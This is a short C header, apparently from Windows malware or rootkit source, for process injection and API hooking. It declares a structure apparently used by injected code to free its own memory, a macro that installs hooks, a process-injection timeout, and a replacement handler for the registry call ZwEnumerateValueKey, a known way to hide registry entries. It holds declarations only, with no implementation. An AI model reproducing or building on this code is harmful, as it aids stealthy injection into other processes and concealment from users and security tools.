#ifndef INJ_H_INCLUDED
#define INJ_H_INCLUDED

typedef WINBASEAPI BOOL WINAPI __VirtualFree(LPVOID lpAddress,SIZE_T dwSize,DWORD dwFreeType);
typedef WINBASEAPI VOID WINAPI __Sleep(DWORD dwMilliseconds);

struct MEMINFO
{
    LPVOID lpStartingAddress;
    __VirtualFree *lpVirtualFree;
    __Sleep *lpSleep;
};

#define addhook(hooks,api) *hooks##->##api##.lpRealAddr=HookAPI(api,##hooks##->##api##.lpHandler);
#define PROCLIST_INJECT_TIMEOUT 50

typedef NTSTATUS WINAPI __ZwEnumerateValueKey(HANDLE KeyHandle,ULONG Index,KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,PVOID KeyValueInformation,ULONG Length,PULONG ResultLength);
NTSTATUS WINAPI ZwEnumerateValueKey_handler(HANDLE KeyHandle,ULONG Index,KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,PVOID KeyValueInformation,ULONG Length,PULONG ResultLength);

#define DEF_HOOK(x) void *p##x;
#define REAL_API(x) __##x *lp##x=(__##x*)p##x

#endif // INJ_H_INCLUDED
